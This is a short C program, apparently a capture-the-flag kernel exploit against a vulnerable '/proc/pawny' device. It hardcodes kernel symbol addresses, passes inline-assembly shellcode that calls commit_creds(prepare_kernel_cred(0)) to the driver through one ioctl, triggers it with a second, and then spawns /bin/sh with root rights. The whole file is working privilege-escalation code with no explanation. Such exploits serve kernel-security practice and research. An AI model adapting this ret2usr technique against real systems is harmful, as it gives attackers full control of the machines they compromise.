#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

size_t prepare_kernel_cred = 0xffffffff810820e0;
size_t commit_creds = 0xffffffff81081eb0;


void shellcode(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, commit_creds;"
        "call rax;"
        ".att_syntax;"
    );
}

int main() {
    int fd = open("/proc/pawny", O_RDWR);
    ioctl(fd, 0x1777, (size_t)shellcode);
    ioctl(fd, 0x1778);
    system("/bin/sh");
    return 0;
}
